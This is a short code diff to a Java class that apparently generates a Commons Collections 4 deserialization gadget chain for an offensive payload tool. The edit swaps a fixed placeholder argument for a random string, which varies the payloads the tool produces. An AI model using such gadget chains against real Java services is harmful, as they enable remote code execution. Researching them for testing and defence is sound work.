@@ -7,6 +7,7 @@ import com.ppp.secmgr.PayloadRunner;
 import com.ppp.sinks.SinkScheduler;
 import com.ppp.sinks.SinksHelper;
 import com.ppp.sinks.annotation.Sink;
+import com.ppp.utils.RanDomUtils;
 import com.ppp.utils.Reflections;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 import org.apache.commons.collections4.Transformer;
@@ -40,11 +41,13 @@ public class CommonsCollections4 implements ObjectPayload<Object> {
     }
 
     public Object getChain(Object templates) throws Exception {
+        String s = RanDomUtils.generateRandomString(1);
+
         ConstantTransformer constant = new ConstantTransformer(String.class);
 
         // mock method name until armed
         Class[] paramTypes = new Class[]{String.class};
-        Object[] args = new Object[]{"x"};
+        Object[] args = new Object[]{s};
         InstantiateTransformer instantiate = new InstantiateTransformer(
                 paramTypes, args);
 
